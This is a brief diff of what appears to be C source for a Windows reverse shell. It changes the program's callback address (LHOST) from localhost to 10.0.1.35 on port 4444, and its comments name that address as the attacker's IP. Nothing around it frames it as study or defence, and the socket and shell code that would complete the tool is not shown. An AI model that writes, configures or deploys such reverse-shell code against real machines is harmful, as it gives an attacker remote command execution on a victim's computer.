@@ -7,7 +7,7 @@
 
 int main() {
     // Specify your LHOST (attacker's IP) and LPORT (port to listen on)
-    const char* LHOST = "127.0.0.1";  // Replace with your attacker's IP
+    const char* LHOST = "10.0.1.35";  // Replace with your attacker's IP
     const int LPORT = 4444;           // Replace with your attacker's port
 
     // Initialize WinSock
